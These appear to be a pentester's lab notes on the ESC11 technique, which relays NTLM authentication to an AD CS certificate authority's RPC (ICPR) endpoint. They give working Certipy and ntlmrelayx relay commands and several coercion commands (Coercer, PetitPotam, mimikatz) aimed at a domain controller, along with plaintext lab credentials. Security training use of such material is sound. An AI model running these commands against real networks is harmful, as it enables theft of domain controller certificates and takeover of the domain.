## NTLM Relay ANY domain computer to AD CS ICertPassage Remote Protocol (ICPR) RPC Endpoints ##
#### What's running under the hood ####
- RPC endpoints support NTLM authentication. The ICertPassage Remote Protocol (ICPR) can be used to request certificates for Windows Client Certificate Enrollment.
- If the `IF_ENFORCEENCRYPTICERTREQUEST` flag is set on a CA (that is packet privacy is enabled), relaying using RPC will not be possible. This flag is set by default on Windows Server 2012 and higher.
- The flag may be removed for backward compatibility for older Windows clients.

#### What the attack is about ####
- This technique is similar to [[ESC8]] except that the attacker relays authentication over the RPC interface of the Certificate Authority instead of the HTTP one.

### Enumeration ###
1. **Certipy**
- Look if `Enforce Encryption for Requests` is set to `Disabled`.
```bash
┌──(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CESP-ADCS]
└─# certipy-esc11 find -u studentadmin@certbulk.cb.corp -p 'IW!LLAdministerStud3nts!' -stdout`
```

### Exploitation ###
##### 1. Listener for incoming certificates #####
1. **Certipy**
- By default, Certipy will request a certificate based on the `Machine` or `User` template depending on whether the relayed account name ends with `$`. It is possible to specify another template with the `-template` parameter.
- For domain controllers, we must specify `-template DomainController`.
```bash
┌──(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CESP-ADCS]
└─# certipy relay -ca cb-ca.cb.corp
```

2. **Impacket-NTLMRelayx**
```bash
┌──(impacket_esc11_venv)-(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CESP-ADCS/impacket-esc11]
└─# /opt/Tools/impacket-esc11/examples/ntlmrelayx.py -t "rpc://cb-ca.cb.corp" -rpc-mode ICPR -icpr-ca-name "CB-CA" -smb2support --adcs --template 'DomainControllerAuthentication'
```

##### 2. Coercion ####
1. **Coercer** (useful if patches have been applied)
```bash
┌──(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CESP-ADCS]
└─# python3 Coercer.py coerce -l cb-ws33.certbulk.cb.corp -t cb-dc.certbulk.cb.corp -u student33 -p htTz2J72nH9KuAXr -d certbulk.cb.corp -v --filter-method-name "EfsRpcDuplicateEncryptionInfoFile"
```

2. **PetitPotam**
```powershell
PS C:\ADCS\Auditor> .\PetitPotam.exe 172.16.100.33 172.16.67.1
```

3. **PetitPotam.ps1**
```powershell
PS C:\ADCS\Auditor> Import-Module .\Invoke-Petitpotam.ps1
PS C:\ADCS\Auditor> Invoke-Petitpotam -Target 172.16.67.1 -CaptureHost 172.16.100.33
```

4. **Mimikatz**
```powershell
PS C:\ADCS\Auditor> .\mimikatz.exe "misc::efs /server:cb-dc.certbulk.cb.corp /connect:172.16.100.33"
```


